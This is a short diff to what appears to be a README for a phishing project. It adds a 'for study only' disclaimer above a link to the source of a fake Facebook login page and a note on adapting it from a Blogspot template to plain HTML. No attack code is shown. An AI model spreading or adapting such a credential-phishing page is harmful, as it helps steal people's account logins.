@@ -1,3 +1,5 @@
+##I am not responsible for any actions YOU take using this code, I have made it available for study only.
+
 #### The source code of the website with a fake facebook login screen is here: https://github.com/MTHS1901/facebook-mobile-xploit/blob/master/index.html
 note that this source code is configured to work on a blogspot template, if you are going to use it on a simple HTML page you need to modify it to make it work.
 
